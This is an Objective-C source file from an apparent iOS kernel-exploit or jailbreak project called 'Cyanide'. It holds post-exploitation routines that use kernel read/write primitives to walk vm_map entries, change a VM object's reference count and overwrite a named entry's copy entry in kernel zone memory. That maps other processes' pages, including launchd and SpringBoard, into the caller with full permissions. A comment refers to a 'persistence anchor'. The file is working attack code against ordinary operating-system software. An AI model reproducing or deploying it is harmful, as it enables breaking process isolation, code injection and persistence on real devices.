//
//  vm.m
//  Cyanide
//
//  Created by seo on 3/29/26.
//

#import <Foundation/Foundation.h>
#import "RemoteCall.h"
#import "vm.h"
#import "../kexploit/krw.h"
#import "../kexploit/offsets.h"
#import "../kexploit/kutils.h"
#import "../kexploit/kexploit_opa334.h"

#define VM_PAGE_PACKED_PTR_BITS                         31
#define VM_PAGE_PACKED_PTR_SHIFT                        6
#define VM_KERNEL_POINTER_SIGNIFICANT_BITS              38
#define PAGE_MASK_K         (PAGE_SIZE - 1ULL)

extern kern_return_t mach_vm_allocate(task_t task, mach_vm_address_t *addr, mach_vm_size_t size, int flags);
extern kern_return_t mach_vm_deallocate(task_t task, mach_vm_address_t addr, mach_vm_size_t size);
extern kern_return_t mach_vm_map(vm_map_t target_task, mach_vm_address_t *address, mach_vm_size_t size, mach_vm_offset_t mask, int flags, mem_entry_name_port_t object, memory_object_offset_t offset, boolean_t copy, vm_prot_t cur_protection, vm_prot_t max_protection, vm_inherit_t inheritance);

uint64_t vm_map_get_header(uint64_t vm_map_ptr)
{
    return vm_map_ptr + off_vm_map_hdr;
}

uint64_t vm_map_header_get_first_entry(uint64_t vm_header_ptr)
{
    return kread_ptr(vm_header_ptr + off_vm_map_header_links_next);
}

uint64_t vm_map_entry_get_next_entry(uint64_t vm_entry_ptr)
{
    return kread_ptr(vm_entry_ptr + off_vm_map_entry_links_next);
}

uint32_t vm_header_get_nentries(uint64_t vm_header_ptr)
{
    return kread32(vm_header_ptr + off_vm_map_header_nentries);
}

void vm_entry_get_range(uint64_t vm_entry_ptr, uint64_t *start_address_out, uint64_t *end_address_out)
{
    uint64_t range[2];
    kreadbuf(vm_entry_ptr + 0x10, &range[0], sizeof(range));
    if (start_address_out) *start_address_out = range[0];
    if (end_address_out) *end_address_out = range[1];
}

void vm_map_iterate_entries(uint64_t vm_map_ptr, void (^itBlock)(uint64_t start, uint64_t end, uint64_t entry, BOOL *stop))
{
    uint64_t header = vm_map_get_header(vm_map_ptr);
    uint64_t entry = vm_map_header_get_first_entry(header);
    uint64_t numEntries = vm_header_get_nentries(header);

    while (entry != 0 && numEntries > 0) {
        uint64_t start = 0, end = 0;
        vm_entry_get_range(entry, &start, &end);

        BOOL stop = NO;
        itBlock(start, end, entry, &stop);
        if (stop) break;

        entry = vm_map_entry_get_next_entry(entry);
        numEntries--;
    }
}

uint64_t vm_map_find_entry(uint64_t vm_map_ptr, uint64_t address)
{
    __block uint64_t found_entry = 0;
    vm_map_iterate_entries(vm_map_ptr, ^(uint64_t start, uint64_t end, uint64_t entry, BOOL *stop) {
        if (address >= start && address < end) {
            found_entry = entry;
            *stop = YES;
        }
    });
    return found_entry;
}

bool VM_PACKING_IS_BASE_RELATIVE(struct VmPackingParams *p)
{
    return (p->vmpp_bits + p->vmpp_shift) <= VM_KERNEL_POINTER_SIGNIFICANT_BITS;
}

uint64_t vm_unpack_pointer(uint64_t packed, struct VmPackingParams *params)
{
    if (!params->vmpp_base_relative)
    {
        int64_t addr = (int64_t)packed;
        addr <<= (64 - params->vmpp_bits);
        addr >>= (64 - params->vmpp_bits - params->vmpp_shift);
        return (uint64_t)addr;
    }
    if (packed)
    {
        return (packed << params->vmpp_shift) + params->vmpp_base;
    }
    return 0;
}

uint64_t vm_pack_pointer(uint64_t ptr, struct VmPackingParams *params)
{
    if (!params->vmpp_base_relative)
    {
        return ptr >> params->vmpp_shift;
    }
    if (ptr)
    {
        return (ptr - params->vmpp_base) >> params->vmpp_shift;
    }
    return 0;
}

uint64_t VME_OFFSET(uint64_t vme_offset_raw)
{
    return vme_offset_raw << 12;
}

struct VMObject vm_get_object(uint64_t map, uint64_t address)
{
    struct VMObject result = {0};
 
    uint64_t entryAddr = vm_map_find_entry(map, address);
    if (!entryAddr) {
        printf("[%s:%d] vm_map_find_entry failed\n", __FUNCTION__, __LINE__);
        return result;
    }
 
    struct vm_map_entry entry = {0};
    kreadbuf(entryAddr, &entry, sizeof(struct vm_map_entry));
 
    struct VmPackingParams params = {0};
    params.vmpp_base  = VM_MIN_KERNEL_ADDRESS;
    params.vmpp_bits  = VM_PAGE_PACKED_PTR_BITS;
    params.vmpp_shift = VM_PAGE_PACKED_PTR_SHIFT;
    params.vmpp_base_relative = VM_PACKING_IS_BASE_RELATIVE(&params) ? 1 : 0;
 
    uint32_t vme_object = entry.vme_object_or_delta;
    uint64_t vmeObject = vm_unpack_pointer((uint64_t)vme_object, &params);
    if (!is_kaddr_valid(vmeObject)) {
        printf("[%s:%d] invalid VM object 0x%llx for user address 0x%llx\n",
               __FUNCTION__, __LINE__,
               (unsigned long long)vmeObject,
               (unsigned long long)address);
        return result;
    }
 
    uint64_t vme_offset_raw = entry.vme_offset;
    uint64_t objectOffs = VME_OFFSET(vme_offset_raw);
 
    uint64_t entryOffs = address - entry.links.start + objectOffs;
 
    result.vmAddress    = address;
    result.address      = vmeObject;
    result.objectOffset = objectOffs;
    result.entryOffset  = entryOffs;
 
    return result;
}
 

struct VMShmem vm_create_shmem_with_object(struct VMObject *object)
{
    struct VMShmem shmem = {0};
    if (!object || !is_kaddr_valid(object->address)) {
        printf("[%s:%d] invalid VM object 0x%llx\n",
               __FUNCTION__, __LINE__,
               object ? (unsigned long long)object->address : 0);
        return shmem;
    }
    
    uint64_t objectSize = mach_vm_round_page(
        kread64(object->address + off_vm_object_vo_un1_vou_size));

    // The local region is scaffolding, not a copy. All that is ever mapped is a
    // single page, at object->entryOffset (see the mach_vm_map below) -- the
    // allocation only has to be long enough for the named entry's range to
    // contain that page. Sizing it to the whole remote object made mapping a
    // page of the dyld shared cache ask for an 8 GB local allocation, which
    // cannot be satisfied; that is why the launchd persistence anchor failed
    // every time on iOS 17 while SpringBoard, whose objects are small, worked.
    uint64_t roundedSize = mach_vm_round_page(object->entryOffset + PAGE_SIZE);
    if (objectSize && roundedSize > objectSize) roundedSize = objectSize;
 
    mach_vm_address_t localAddr = 0;
    kern_return_t ret = mach_vm_allocate(mach_task_self_, &localAddr, roundedSize, VM_FLAGS_ANYWHERE);
    if (ret != KERN_SUCCESS) {
        // Should now be rare: the allocation is sized to the mapped page, not
        // the whole object. Keep the detail in case it ever fails again.
        printf("[%s:%d] mach_vm_allocate failed: %s (vmAddr=%#llx object=%#llx "
               "alloc=%#llx (object=%#llx) objectOffset=%#llx entryOffset=%#llx)\n",
               __FUNCTION__, __LINE__, mach_error_string(ret),
               (unsigned long long)object->vmAddress,
               (unsigned long long)object->address,
               (unsigned long long)roundedSize,
               (unsigned long long)objectSize,
               (unsigned long long)object->objectOffset,
               (unsigned long long)object->entryOffset);
        return shmem;
    }
 
    mach_port_t memoryObject = MACH_PORT_NULL;
    memory_object_size_t entrySize = roundedSize;
    ret = mach_make_memory_entry_64(mach_task_self_, &entrySize, (memory_object_offset_t)localAddr, VM_PROT_READ | VM_PROT_WRITE, &memoryObject, MACH_PORT_NULL);
    if (ret != KERN_SUCCESS) {
        printf("[%s:%d] mach_make_memory_entry_64 failed: %s\n", __FUNCTION__, __LINE__, mach_error_string(ret));
        mach_vm_deallocate(mach_task_self_, localAddr, roundedSize);
        return shmem;
    }
 
    // Each hop below feeds the next read and, ultimately, the ref_count bump
    // and the zone-element write at nextAddr. A failed read zero-fills, so an
    // unchecked chain would end in a write through a garbage pointer. Validate
    // every hop and back out (releasing the entry and the scaffolding) instead.
    uint64_t shmemNamedEntry = task_get_ipc_port_kobject(task_self(), memoryObject);
    if (!is_kaddr_valid(shmemNamedEntry)) {
        printf("[%s:%d] invalid named entry %#llx\n", __FUNCTION__, __LINE__,
               (unsigned long long)shmemNamedEntry);
        mach_port_deallocate(mach_task_self_, memoryObject);
        mach_vm_deallocate(mach_task_self_, localAddr, roundedSize);
        return shmem;
    }
    uint64_t shmemVMCopyAddr = kread64(shmemNamedEntry + off_vm_named_entry_backing_copy);
    if (!is_kaddr_valid(shmemVMCopyAddr)) {
        printf("[%s:%d] invalid backing copy %#llx\n", __FUNCTION__, __LINE__,
               (unsigned long long)shmemVMCopyAddr);
        mach_port_deallocate(mach_task_self_, memoryObject);
        mach_vm_deallocate(mach_task_self_, localAddr, roundedSize);
        return shmem;
    }
    uint64_t nextAddr        = kread64(shmemVMCopyAddr + off_vm_named_entry_size);
    if (!is_kaddr_valid(nextAddr)) {
        printf("[%s:%d] invalid copy entry %#llx\n", __FUNCTION__, __LINE__,
               (unsigned long long)nextAddr);
        mach_port_deallocate(mach_task_self_, memoryObject);
        mach_vm_deallocate(mach_task_self_, localAddr, roundedSize);
        return shmem;
    }
 
    struct vm_map_entry entry = {0};
    kreadbuf(nextAddr, &entry, sizeof(struct vm_map_entry));
    
 
    if (entry.vme_kernel_object || entry.is_sub_map) {
        printf("[%s:%d] Entry cannot be a submap or kernel object\n", __FUNCTION__, __LINE__);
        mach_port_deallocate(mach_task_self_, memoryObject);
        mach_vm_deallocate(mach_task_self_, localAddr, roundedSize);
        return shmem;
    }
 
    struct VmPackingParams params = {0};
    params.vmpp_base  = VM_MIN_KERNEL_ADDRESS;
    params.vmpp_bits  = VM_PAGE_PACKED_PTR_BITS;
    params.vmpp_shift = VM_PAGE_PACKED_PTR_SHIFT;
    params.vmpp_base_relative = VM_PACKING_IS_BASE_RELATIVE(&params) ? 1 : 0;
    uint64_t packedPointer = vm_pack_pointer(object->address, &params);
 
    // Account for the extra reference the patched copy entry below is about to
    // hold on this object. The kernel keeps its page accounting in the same
    // 32-byte write window, so bump the count only while it is holding still --
    // see kadjust32_stable(). If it will not settle, back out instead of
    // guessing: a ref_count left too low frees the object out from under
    // whoever else has it mapped.
    if (!kadjust32_stable(object->address + off_vm_object_ref_count,
                          +1, NULL, NULL)) {
        printf("[%s:%d] refusing to map: ref_count at %#llx would not settle\n",
               __FUNCTION__, __LINE__,
               (unsigned long long)(object->address + off_vm_object_ref_count));
        mach_port_deallocate(mach_task_self_, memoryObject);
        mach_vm_deallocate(mach_task_self_, localAddr, roundedSize);
        return shmem;
    }
    
    entry.vme_object_or_delta = (uint32_t)packedPointer;
    entry.vme_offset = object->objectOffset;
 
    kwrite_zone_element(nextAddr, &entry, sizeof(struct vm_map_entry));
 
    mach_vm_address_t mappedAddr = 0;
    vm_prot_t curProt = VM_PROT_ALL | VM_PROT_IS_MASK;
    vm_prot_t maxProt = VM_PROT_ALL | VM_PROT_IS_MASK;
 
    ret = mach_vm_map(mach_task_self_, &mappedAddr, PAGE_SIZE, 0,
                       VM_FLAGS_ANYWHERE, memoryObject,
                       (memory_object_offset_t)object->entryOffset,
                       FALSE, curProt, maxProt, VM_INHERIT_NONE);
    if (ret != KERN_SUCCESS) {
        printf("[%s:%d] mach_vm_map failed: %s\n", __FUNCTION__, __LINE__, mach_error_string(ret));
        mappedAddr = 0;
    }
 
    ret = mach_vm_deallocate(mach_task_self_, localAddr, roundedSize);
    if (ret != KERN_SUCCESS)
        printf("[%s:%d] mach_vm_deallocate failed: %s\n", __FUNCTION__, __LINE__, mach_error_string(ret));
 
    shmem.port          = (uint64_t)memoryObject;
    shmem.remoteAddress = object->vmAddress;
    shmem.localAddress  = (uint64_t)mappedAddr;
    shmem.used          = (mappedAddr != 0);
 
    return shmem;
}

struct VMShmem vm_map_remote_page(uint64_t vmMap, uint64_t address)
{
    struct VMShmem shmem = {0};
    struct VMObject vmObject = vm_get_object(vmMap, address);
    if (!vmObject.address)
    {
        printf("[%s:%d] Failed to get VM object for 0x%llx\n", __FUNCTION__, __LINE__, (unsigned long long)address);
        return shmem;
    }
 
    return vm_create_shmem_with_object(&vmObject);
}
